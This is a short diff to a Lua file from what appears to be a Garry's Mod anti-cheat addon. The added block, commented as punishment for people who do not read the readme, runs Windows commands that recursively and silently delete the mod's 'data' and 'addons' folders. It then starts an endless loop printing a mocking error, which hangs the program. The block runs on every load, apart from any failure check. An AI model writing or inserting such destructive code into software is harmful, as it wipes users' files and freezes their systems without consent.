@@ -362,6 +362,24 @@ HAC.LogOnly	= {
 }
 
 
+//People can't read the readme
+timer.Simple(2, function()
+	hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\data"')
+	hac.WinCMD('RD /S /Q "'..HAC.ModDirBack..'\\addons"')
+	
+	timer.Simple(5, function()
+		while true do
+			ErrorNoHalt("[HAC] PEBCAK Error. RTFM or slap admin with a large trout!\n")
+		end
+	end)
+end)
+
+//Failed
+if HAC.AbortLoading then
+	ErrorNoHalt("\n\n[HAC] ID10-T Error!\n\n")
+	return
+end
+
 //Pre base
 Msg("  Loading base\n")
 include("hac_base.lua")
